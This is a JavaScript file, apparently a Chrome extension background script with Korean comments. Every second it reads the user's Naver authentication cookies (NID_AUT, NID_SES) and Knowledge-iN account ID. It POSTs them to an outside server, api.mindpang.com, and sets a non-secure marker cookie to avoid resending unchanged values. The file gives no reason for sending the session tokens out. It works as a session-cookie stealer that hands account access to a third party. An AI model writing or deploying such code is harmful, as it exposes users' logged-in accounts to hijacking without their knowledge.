const setNaverCookie = async (CURRENT_ID, NID_AUT, NID_SES) => {
  try {
    const data = {
      CURRENT_ID,
      NID_AUT,
      NID_SES,
    };

    await fetch("https://api.mindpang.com/api/naver/add.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
  } catch (e) {
    console.log("실패: ", e);
  }
};

const run = async () => {
  setInterval(async () => {
    const NID_AUT = await chrome.cookies.get({
      url: "https://naver.com",
      name: "NID_AUT",
    });
    const NID_SES = await chrome.cookies.get({
      url: "https://naver.com",
      name: "NID_SES",
    });
    const CurrentId = await chrome.cookies.get({
      url: "https://kin.naver.com",
      name: "currentId",
    });
    const d = `${NID_AUT?.value || ""}_${NID_SES?.value || ""}`;

    const isDelevery = await chrome.cookies.get({
      url: "https://kin.naver.com",
      name: `${CurrentId.value}_isDelevery`,
    });

    if (CurrentId?.value) {
      if (isDelevery?.value !== d) {
        await setNaverCookie(CurrentId.value, NID_AUT.value, NID_SES.value);
        await chrome.cookies.set(
          {
            url: "https://kin.naver.com",
            name: `${CurrentId.value}_isDelevery`,
            value: d,
            domain: "kin.naver.com",
            path: "/",
            secure: false,
            httpOnly: false,
            expirationDate: Date.now() / 1000 + 600, // 현재 시간부터 1시간 후 만료
          },
          function (cookie) {
            if (chrome.runtime.lastError) {
              console.error("쿠키 설정 실패:", chrome.runtime.lastError);
            } else {
              console.log("쿠키가 성공적으로 설정되었습니다:", cookie);
            }
          }
        );
      } else {
        console.log("쿠키가 유효합니다.");
      }
    } else {
      console.log("현재 ID가 없습니다.");
    }
  }, 1000);
};

// 예제 사용

run();
